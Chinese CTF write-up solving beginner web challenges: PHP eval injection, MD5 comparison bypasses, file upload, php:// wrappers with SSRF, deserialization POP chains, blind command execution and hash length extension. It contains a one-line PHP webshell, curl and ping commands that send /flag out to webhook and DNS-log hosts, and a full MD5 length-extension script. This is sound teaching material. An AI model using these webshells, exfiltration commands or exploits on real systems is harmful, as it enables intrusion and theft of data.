# week1
## 喵喵喵´•ﻌ•`
### 考点：
**eval（）函数**：

eval() 函数把字符串按照 PHP 代码来计算。

该字符串必须是合法的 PHP 代码，且必须以分号结尾。

**system()函数**

php 代码不能直接执行 shell 命令，还需要借助 system （）函数

### 题解：
进入题目，源码如下

```php
<?php
// 高亮显示当前文件内容，方便调试和查看代码结构
highlight_file(__FILE__);
// 关闭错误报告
error_reporting(0);

// 获取 GET 请求中的参数 'DT' 的值，并赋值给变量 $a
$a = $_GET['DT'];

// 使用 eval 函数执行 $a 中的代码，这是非常危险的操作，因为可以执行任意用户输入的代码，可能导致安全漏洞
eval($a);

?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730723685897-6fdb7bbc-69dd-455c-a88f-ca31df1f5762.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730723739027-8385c6b1-99db-43ed-a50f-d793705a656f.png)

## md5绕过欸
### 考点：
**弱类型比较（==）：** 弱类型比较，两个不同类型比较时，会自动转换成相同类型后再比较值  

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731668422252-5a890dc4-5e90-4b1c-bbf9-c7bf0ac748aa.png)

> if("admin"==0) //true
>
> if("1admin"==1)//true
>
> if("admin1"==1)//false
>
> if("0e12324"=="0e1324")//true
>

**强类型比较： **需要比较值和类型  

**MD5 加密原理：**

1. MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组**级联**后将生成一个128位散列值。
2. 在MD5算法中，首先需要对信息进行填充，填充方法如下：先在信息后面填充一个1，之后就是无数个0，直到使其字节长度对512求余数的结果等于448，即（n*512) + 448 ,为什么要是余数为448呢，因为剩下的512-448 等于64位 是用于表示填充前的信息长度。加上剩下的64位，即（n+1)*512,长度刚刚好是512的整数倍数。
3. 然后就与链接变量进行循环运算，得出结果。MD5中有四个32位被称作链接变量（Chaining Variable）的整数参数，他们分别为：A=0x01234567，B=0x89abcdef，C=0xfedcba98，D=0x76543210。当设置好这四个链接变量后，就开始进入算法的四轮循环运算。具体内部怎么运算，是关于数学方面的，有兴趣的同学可以自行去了解下，这里不进行更加多的解释。

**MD5 绕过：**

+ **未规定输入类型:**

因为 md5() 函数不能处理数组,所以在未明确规定输入类型时,可以输入数组类型,从而实现对强比较和弱比较		的绕过 

+ **规定输入类型**
    - **弱比较**

提供部分数据及 md5 加密后的数据

```plain
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s155964671a
0e342768416822451524974117254469
  
s1184209335a
0e072485820392773389523109082030
```

    - **强比较**

这里展示一组

```php
p1=ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%13%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%10c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%7Bdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13Lm%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%8A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7%EA%03_%27%C4
p2=ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%93%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%90c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%FBdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13L%ED%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%0A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7j%03_%27%C4  
```

### 题解：
进入题目，源码如下

```php
<?php
// 高亮显示当前文件内容，方便调试和查看代码结构
highlight_file(__FILE__);
// 关闭错误报告
error_reporting(0);
// 引入包含 flag 的文件
require 'flag.php';

// 判断是否同时设置了 GET 参数 'name'、'name2' 和 POST 参数 'password'、'password2'
if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2'])) {
    // 获取 GET 参数 'name' 的值并赋值给 $name
    $name = $_GET['name'];
    // 获取 GET 参数 'name2' 的值并赋值给 $name2
    $name2 = $_GET['name2'];
    // 获取 POST 参数 'password' 的值并赋值给 $password
    $password = $_POST['password'];
    // 获取 POST 参数 'password2' 的值并赋值给 $password2
    $password2 = $_POST['password2'];
    // 如果 $name 不等于 $password 且 $name 和 $password 的 MD5 值相等
    if ($name!= $password && md5($name) == md5($password)) {
        // 如果 $name2 不等于 $password2 且 $name2 和 $password2 的 MD5 值也相等
        if ($name2!== $password2 && md5($name2) === md5($password2)) {
            // 输出 flag
            echo $flag;
        } else {
            // 输出提示信息，表示第二个条件不满足
            echo "再看看啊，马上绕过嘞！";
        }
    } else {
        // 输出提示信息，表示第一个条件不满足
        echo "错啦错啦";
    }
} else {
    // 如果没有设置必要的参数，输出提示信息
    echo '没看到参数呐';
}
?>
```

因为这题没有禁用数组，所以传入四个参数均为数组就可以

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730724524495-ed0dc89d-3a15-45bb-bd1a-9624af9cf3ee.png)

## HTTP 是什么呀
### 考点：
**http 请求头：**

请求头内容请看[参考文章](https://www.cnblogs.com/gxz-sw/p/6761984.html)

**补充:**

**X-Forwarded-For: **简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP

### 题解：
要求如下

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730724969465-da54ea22-4ef1-405a-913b-c2314a72048a.png)

burp 抓包修改请求头

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730725408762-d491aab4-421c-4701-bdb7-ddfec3d2cce5.png)

之后进行 base64 解码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730725948293-e70ceade-15da-4f49-96d7-8ef452403312.png)

## A Dark Room
### 考点：
不太明白这个题，做了可点击的界面，却把 flag 直接放在源码中

### 题解：
flag 在源码中,按下 F12 即可

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730726433049-c769a6c1-11cd-4b18-8b51-4aad27445674.png)

## upload
### 考点：
**文件上传漏洞(**上传一个 php 文件或者将一句话木马传入可以解析 php 的地方)

编写一个 php 文件

内容是一句话木马,蚁剑连接时密码就是 shell

```php
<?php eval($_POST['shell']);?>
```

### 题解：
![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730726681807-e92172bd-8a1e-428c-bd86-4cb4e889bf2c.png)

虽然网页标签名叫“上传喜欢的照片”，但是随便上传一个文件，发现上传成功而且爆出了源码，看见没有任何过滤，直接写个一句话木马上传

上传之后，根据源码知道木马文件地址在同级目录 upload 下而且没有被重命名

之后蚁剑连接，拿到 flag

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730727219087-ea63dcd8-4481-47f9-9c68-7cc81c61e8fe.png)

## Aura 酱的礼物
### 考点：
**php 伪协议:**[**参考文章**](https://blog.csdn.net/cosmoslin/article/details/120695429?ops_request_misc=%257B%2522request%255Fid%2522%253A%252202F23DC3-ED75-41BD-892E-C1B43F54E542%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=02F23DC3-ED75-41BD-892E-C1B43F54E542&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-120695429-null-null.nonecase&utm_term=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4450)

**题目中的 file_get_contents()可以使用 data:// 伪协议绕过**

**最后文件包含,可以使用 filter:// 伪协议读取**

**ssrf**

参考文章：[https://tttang.com/archive/1648/](https://tttang.com/archive/1648/)

绕过

+ @符，对于一个 url 的访问实际上是以 @符后为准的，比如说[xxxx.com](https://xxxx.com/)@10.10.10.10，则实际上访问的是 10.10.10.10 这个地址。
+ 网址后加 xip.io，其原理是例如 10.10.10.10.xip.io 会被解析成 10.10.10.10。
+ 进制转换，将 ip 转换成八进制、十进制、十六进制这种，同样也可以正常访问，例如将 10.10.10.10 转换为十进制是 168430090，在浏览器访问 http://168430090 就会去访问 10.10.10.10 这个地址。

### 题解：
进入题目，得如下源码

```php
<?php
// 高亮显示当前文件内容，方便调试和查看代码结构
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~

// 获取 POST 请求中的参数 'pen' 的值并赋值给 $pen
$pen = $_POST['pen'];
// 如果通过 file_get_contents 函数读取 $pen 所指向的内容不等于 'Aura'，输出错误信息并终止程序
if (file_get_contents($pen)!== 'Aura') {
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
// 获取 POST 请求中的参数 'challenge' 的值并赋值给 $challenge
$challenge = $_POST['challenge'];
// 如果 $challenge 不以 'http://jasmineaura.github.io' 开头，输出错误信息并终止程序
if (strpos($challenge, 'http://jasmineaura.github.io')!== 0) {
    die('这不是 Aura 的博客！');
}

// 通过 file_get_contents 函数读取 $challenge 所指向的博客内容并赋值给 $blog_content
$blog_content = file_get_contents($challenge);
// 如果 $blog_content 中不包含 '已经收到 Kengwang 的礼物啦'，输出错误信息并终止程序
if (strpos($blog_content, '已经收到 Kengwang 的礼物啦') === false) {
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
// 获取 POST 请求中的参数 'gift' 的值并赋值给 $gift
$gift = $_POST['gift'];
// 尝试包含由 $gift 指定的文件，这里假设是包含 flag.php 文件，但这样的代码存在安全风险，因为可以通过用户输入的 $gift 包含任意文件
include($gift);
?>
```

先使用 data://伪协议

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675060725-d50390c8-1d9b-434c-9c0d-a6397edd13aa.png)

第二步要以 http://jasmineaura.github.io 开头,因为博客打不开又要再里面写内容,可以使用@ 符号将 url 地址转接到本机上.可见绕过成功了

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675364378-230c9a1c-bfeb-4459-9aae-54b9de346274.png)

接下来包含文件,但是不没有看到回显,猜测可能在 php 文件的注释里,利用 php://filter伪协议把注释带出来,注意要编码(要不然注释还是会被当作注释,带不出来)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675447214-1b2cb9bd-2f91-4be5-8dd2-b63c6c6113b1.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731675749560-603647c5-c44c-4006-a122-85f0ef0ffb02.png)

最后进行 base64 解码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730728516429-ffb17993-a309-4d84-8db1-2aa8645a9dc1.png)

# week2
## ez_ser
### 考点：
**反序列化和 php 魔术方法**

**魔术方法:**

1.__construct，__destruct

__constuct构建对象的时被调用；

__destruct明确销毁对象或脚本结束时被调用；

2.__get，__set

__set当给不可访问或不存在属性赋值时被调用

__get读取不可访问或不存在属性时被调用

3.__isset，__unset

__isset对不可访问或不存在的属性调用isset()或empty()时被调用

__unset对不可访问或不存在的属性进行unset时被调用

4.__call，__callStatic

__call调用不可访问或不存在的方法时被调用

__callStatic调用不可访问或不存在的静态方法时被调用

5.__sleep，__wakeup

__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用

__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作

6.__clone

进行对象clone时被调用，用来调整对象的克隆行为

7.__toString

当一个类被转换成字符串时被调用

8.__invoke

当以函数方式调用对象时被调用

9.__set_state

当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。

10.__debuginfo

当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本

**pop 链构造的关键就是充分利用各种魔术方法的特性,实现一个接一个的自动调用,最后获取 flag**

### 题解：
进入题目，得到源码

```php
<?php
// 高亮显示当前文件内容，方便调试和查看代码结构
highlight_file(__FILE__);
// 关闭错误报告
error_reporting(0);

// 定义类 re
class re{
    // 定义公共属性 chu0
    public $chu0;
    // 定义魔术方法 __toString，当对象被当作字符串使用时调用
    public function __toString(){
        // 如果 chu0 属性未设置
        if(!isset($this->chu0)){
            // 返回一个字符串
            return "I can not believes!";
        }
        // 这里尝试访问一个未定义的属性 $nononono，可能会导致错误
        $this->chu0->$nononono;
    }
}

// 定义类 web
class web {
    // 定义公共属性 kw
    public $kw;
    // 定义公共属性 dt
    public $dt;
    // 定义魔术方法 __wakeup，在对象被反序列化时调用
    public function __wakeup() {
        // 输出字符串和 kw 属性的值
        echo "lalalla".$this->kw;
    }
    // 定义魔术方法 __destruct，当对象被销毁时调用
    public function __destruct() {
        // 输出字符串
        echo "ALL Done!";
    }
}

// 定义类 pwn
class pwn {
    // 定义公共属性 dusk
    public $dusk;
    // 定义公共属性 over
    public $over;
    // 定义魔术方法 __get，当尝试访问一个不存在的属性时调用
    public function __get($name) {
        // 如果 dusk 属性不等于 "gods"
        if($this->dusk!= "gods"){
            // 输出字符串
            echo "什么，你竟敢不认可?";
        }
        // 调用 over 属性的 getflag 方法
        $this->over->getflag();
    }
}

// 定义类 Misc
class Misc {
    // 定义公共属性 nothing
    public $nothing;
    // 定义公共属性 flag
    public $flag;
    // 定义方法 getflag
    public function getflag() {
        // 使用 eval 执行 system 函数来执行命令，这里是读取 /flag 文件内容，存在安全风险
        eval("system('cat /flag');");
    }
}

// 定义类 Crypto
class Crypto {
    // 定义魔术方法 __wakeup，在对象被反序列化时调用
    public function __wakeup() {
        // 输出字符串
        echo "happy happy happy!";
    }
    // 定义方法 getflag
    public function getflag() {
        // 输出字符串
        echo "you are over!";
    }
}

// 获取 GET 请求中的参数 'ser' 的值并赋值给 $ser
$ser = $_GET['ser'];
// 尝试反序列化 $ser 的内容，可能存在安全风险，因为用户可以控制反序列化的数据
unserialize($ser);
?>
```

pop 链构造思路

unserialize()->web 类的 wakeup()[ 函数内部的 . 拼接字符串]->re 类的 tostring() [函数内部尝试访问一个未定义的属性,如果有 get() 函数,则会自动调用]->pwn 类的 get() [ 函数内部调用了 getflag()函数 ]->Misc 类的 getflag()函数->得到 flag

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

$a = new re();
$b = new web();
$c = new pwn();
$d = new misc();

$c->over = $d;
$a->chu0 = $c;
$b->kw = $a;
echo "ser=".serialize($b);
```

结果

```php
ser=O:3:"web":2:{s:2:"kw";O:2:"re":1:{s:4:"chu0";O:3:"pwn":2:{s:4:"dusk";N;s:4:"over";O:4:"Misc":2:{s:7:"nothing";N;s:4:"flag";N;}}}s:2:"dt";N;}
```

$_GET 传参

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730729607854-ca30ef09-65de-435c-b116-d9de025f007c.png)

## 一起吃豆豆
### 考点：
**玩游戏题,一般可以读 js 代码获取灵感**

### 题解：
这是一个 js 写的游戏

进入之后就是玩游戏，应该游戏通关之后就会给答案了

这里找到游戏的 js 代码，虽然 F12 和 ctrl+shift+I 都没用，但是还可以手动点更多工具里面的 web 开发者工具

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730730349012-ba6706bd-2997-4f1f-89c7-9e9e5b730044.png)

找到游戏结束的代码,丢给 AI 加注释

```javascript
// 使用context.fillText方法来绘制文本
// _LIFE是一个变量，这里通过条件判断来决定要绘制的文本内容
// 如果_LIFE为真（true）
context.fillText(
    // 使用atob函数对Base64编码的字符串进行解码
    // "QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ=="是一个Base64编码的字符串
    _LIFE? atob("QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==") : 'GAME OVER',
    // this.x和this.y是文本绘制的坐标位置
    this.x,
    this.y
);
```

可以直接进行 base64 解码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730730417021-606b72f4-863b-4054-9aa0-6cf3ba1f0518.png)

也可以在控制台执行这个函数，得到 flag

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730730459169-6d744a34-c58f-47ed-97e5-a7e0814f2d1e.png)

## 你听不到我的声音
### 考点：
**shell_exec()函数**

通过 shell 执行命令并将完整的输出以字符串的方式返回(有返回值没有回显**)**

**linux 重定向符号:**[**参考文章**](https://www.runoob.com/linux/linux-shell-io-redirections.html)

 command > file  ( 将输出重定向到 file )



### 题解：
```php
 <?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']); 
```

代码很简单，但是 shell_exec()函数不会直接回显，

**方法一:** 可以用重定向

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732002721-625a02cd-1420-4606-8f41-2e8adc197d23.png)

浏览器打开

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732072982-02243eb3-94e6-4e37-9667-f2d9f2f3cf85.png)

找到文件，之后 cat /flag

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732139656-db0c46ad-b693-43ae-b0f3-952727d23709.png)

再次打开 1.txt，得到源码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732160660-e598e305-b6b4-411b-8de9-fa6b73ead6b3.png)

**方法二:**使用 curl 外带

进入[ webhook 网站](https://webhook.site/)

会得到一个自己的网址![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686817280-87a0624f-84ce-4455-8d2b-6d5f409a89ed.png)

按照这样的格式,url 编码之后,post 传参

```plain
curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686302150-eb00aac5-5bee-4f16-bc61-89e82313eb45.png)

回到网站,得到请求了.网址后边的东西解码一下

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686436635-7aa344c8-bf3c-4998-8023-de01ad0af854.png)

得到 flag

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731686498904-622d38e6-c2a2-4186-b516-f40f1ca15db6.png)

**方法三:Dnslog 外带**

**在刚才的网站拿到 DNS name**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731687105944-3491c15d-04cd-4203-a5f9-5dc99f6f0788.png)

之后按如下格式使用 ping 命令外带,url 编码之后传参

```plain
ping `cat /flag | base64`.xxxxxxx.dnshook.site
```

## RCEisamazingwithspace
### 考点：
**空格绕过 :**[**参考文章**](https://www.cnblogs.com/zzjdbk/p/13491028.html)

+ IFS

$IFS表示分隔符，指定了IFS代表的符号后，该符号会转为空格显示输出

${IFS},$IFS 和$IFS$9 都表示空格

+ <>（重定向符）



+ %09（需要 php 环境）

### 题解：
进入题目，得到源码如下

```php
<?php
  // 高亮显示当前文件内容，方便调试和查看代码结构
  highlight_file(__FILE__);

// 获取 POST 请求中的参数 'cmd' 的值并赋值给 $cmd
$cmd = $_POST['cmd'];

// 使用 preg_match 函数检查命令中是否存在空格，如果存在空格则输出提示信息并退出程序
if (preg_match('/\s/', $cmd)) {
  echo 'Space not allowed in command';
  exit;
}

// 执行用户输入的命令，但这样的代码存在严重的安全风险，因为可以执行任意命令
system($cmd);
?>
$_POST 传入 cmd=cat${IFS}/flag
```

**法一：**使用 $IFS 绕过

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732907871-e9c4116d-2c4e-46a5-9879-213cff0aed72.png)

**法二：使用 < 绕过**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731727695578-0432cb7a-7ee2-4641-871a-c43928ed1667.png)

## 所以你说你懂 MD5?
### 考点：
**哈希长度拓展攻击：**[**参考文章**](https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html)

### 题解：
```php
<?php
// 启动会话
session_start();
// 高亮显示当前文件内容，方便调试和查看代码结构
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

// 获取 POST 请求中的参数 'apple' 的值并赋值给 $apple
$apple = $_POST['apple'];
// 获取 POST 请求中的参数 'banana' 的值并赋值给 $banana
$banana = $_POST['banana'];
// 如果 $apple 等于 $banana 或者 $apple 和 $banana 的 MD5 值不相等，输出提示信息并终止程序
if (!($apple!== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
// 再次获取 POST 请求中的参数并强制转换为字符串后重新赋值给 $apple 和 $banana
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
// 检查条件，如果不满足则输出提示信息并终止程序
if (!((string)$apple!== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
// 再次获取 POST 请求中的参数并强制转换为字符串后重新赋值给 $apple 和 $banana
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
// 检查条件，如果不满足则输出提示信息并终止程序
if (!((string)$apple!== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
// 如果会话中不存在 'random'，则生成一个随机字符串并存储在会话中
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)). bin2hex(random_bytes(16)). bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
// 获取会话中的随机字符串并赋值给 $random
$random = $_SESSION['random'];
// 输出随机字符串的 MD5 值和换行符
echo md5($random);
echo '<br />';

// 如果 POST 请求中不存在 'name' 参数，则将 $name 设为 'user'
$name = $_POST['name']?? 'user';

// 检查 $name 的末尾是否是 'admin'，如果不是则输出提示信息并终止程序
if (substr($name, -5)!== 'admin') {
    die('不是管理员也来凑热闹?');
}

// 获取 POST 请求中的参数 'md5' 的值并赋值给 $md5
$md5 = $_POST['md5'];
// 计算随机字符串和 $name 拼接后的 MD5 值，如果与传入的 $md5 不相等，则输出提示信息并终止程序
if (md5($random. $name)!== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
// 输出提示信息和读取到的 flag 文件内容
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag');
?>
```

对于第一个 if 语句，因为没有禁用数组，直接传入数组绕过

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731737411373-3c287cb9-8672-4520-9645-6ede63388752.png)

第二个 if 语句，数组被禁用了，而且是弱比较，老老实实传字符串吧

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731738066137-83742fca-b7e2-4faa-a1c1-60802150a88a.png)

第三个 if 语句，数组被禁用了，还是强碰撞，还是传字符串吧

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731738302154-515ec98f-7b86-4d92-8c5c-a1efb85ec2de.png)

贴一下目前的输入

```php
apple[]=1&banana[]=2&appple=s1502113478a&bananana=s1885207154a&apppple=ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%13%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%10c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%7Bdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13Lm%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%8A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7%EA%03_%27%C4&banananana=ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%93%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%90c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%FBdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13L%ED%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%0A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7j%03_%27%C4
```

第四步长度拓展攻击:[参考文章](https://blog.csdn.net/qq_74350234/article/details/141757892)

贴个脚本

```python
from struct import pack, unpack
from math import floor, sin
 
 
"""
MD5 Extension Attack
====================
@refs
https://github.com/shellfeel/hash-ext-attack
"""
 
 
class MD5:
 
    def __init__(self):
        self.A, self.B, self.C, self.D = \
            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values
        self.r: list[int] = \
            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \
            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values
        self.k: list[int] = \
            [floor(abs(sin(i + 1)) * pow(2, 32))
             for i in range(64)]  # constants
 
    def _lrot(self, x: int, n: int) -> int:
        # left rotate
        return (x << n) | (x >> 32 - n)
 
    def update(self, chunk: bytes) -> None:
        # update the hash for a chunk of data (64 bytes)
        w = list(unpack('<'+'I'*16, chunk))
        a, b, c, d = self.A, self.B, self.C, self.D
 
        for i in range(64):
            if i < 16:
                f = (b & c) | ((~b) & d)
                flag = i
            elif i < 32:
                f = (b & d) | (c & (~d))
                flag = (5 * i + 1) % 16
            elif i < 48:
                f = (b ^ c ^ d)
                flag = (3 * i + 5) % 16
            else:
                f = c ^ (b | (~d))
                flag = (7 * i) % 16
 
            tmp = b + \
                self._lrot((a + f + self.k[i] + w[flag])
                           & 0xffffffff, self.r[i])
            a, b, c, d = d, tmp & 0xffffffff, b, c
 
        self.A = (self.A + a) & 0xffffffff
        self.B = (self.B + b) & 0xffffffff
        self.C = (self.C + c) & 0xffffffff
        self.D = (self.D + d) & 0xffffffff
 
    def extend(self, msg: bytes) -> None:
        # extend the hash with a new message (padded)
        assert len(msg) % 64 == 0
        for i in range(0, len(msg), 64):
            self.update(msg[i:i + 64])
 
    def padding(self, msg: bytes) -> bytes:
        # pad the message
        length = pack('<Q', len(msg) * 8)
 
        msg += b'\x80'
        msg += b'\x00' * ((56 - len(msg)) % 64)
        msg += length
 
        return msg
 
    def digest(self) -> bytes:
        # return the hash
        return pack('<IIII', self.A, self.B, self.C, self.D)
 
 
def verify_md5(test_string: bytes) -> None:
    # (DEBUG function) verify the MD5 implementation
    from hashlib import md5 as md5_hashlib
 
    def md5_manual(msg: bytes) -> bytes:
        md5 = MD5()
        md5.extend(md5.padding(msg))
        return md5.digest()
 
    manual_result = md5_manual(test_string).hex()
    hashlib_result = md5_hashlib(test_string).hexdigest()
 
    assert manual_result == hashlib_result, "Test failed!"
 
 
def attack(message_len: int, known_hash: str,
           append_str: bytes) -> tuple:
    # MD5 extension attack
    md5 = MD5()
 
    previous_text = md5.padding(b"*" * message_len)
    current_text = previous_text + append_str
 
    md5.A, md5.B, md5.C, md5.D = unpack("<IIII", bytes.fromhex(known_hash))
    md5.extend(md5.padding(current_text)[len(previous_text):])
 
    return current_text[message_len:], md5.digest().hex()
 
 
if __name__ == '__main__':
 
    message_len = int(input("[>] Input known text length: "))
    known_hash = input("[>] Input known hash: ").strip()
    append_text = input("[>] Input append text: ").strip().encode()
 
    print("[*] Attacking...")
 
    extend_str, final_hash = attack(message_len, known_hash, append_text)
 
    from urllib.parse import quote
    from base64 import b64encode
 
    print("[+] Extend text:", extend_str)
    print("[+] Extend text (URL encoded):", quote(extend_str))
    print("[+] Extend text (Base64):", b64encode(extend_str).decode())
    print("[+] Final hash:", final_hash)
```

按如下格式输入脚本

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731742848461-c97c6524-c90b-42f7-b0b3-536cc2ea8d8b.png)

将 url 后的内容贴到 name 参数里，将 hash 值贴到 md5 里就可以了

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731742627366-094dd029-a4c9-43a9-aada-d52d329cc135.png)



## 数学大师
### 考点：
**python 的 requests 库：**[**参考文章**](https://www.cnblogs.com/lanyinhao/p/9634742.html)**                          **

**正则表达式：**[**参考文章**](https://www.cnblogs.com/dyfblog/p/5880728.html)

这里写一下 match 和 search 的区别

+ match

> 使用指定正则去待操作字符串中寻找可以匹配的子串, 返回匹配上的第一个字串，并且不再继续找，需要注意的是 match 函数是从字符串开始处开始查找的，如果开始处不匹配，则不再继续寻找，返回值为 一个 		SRE_Match
>

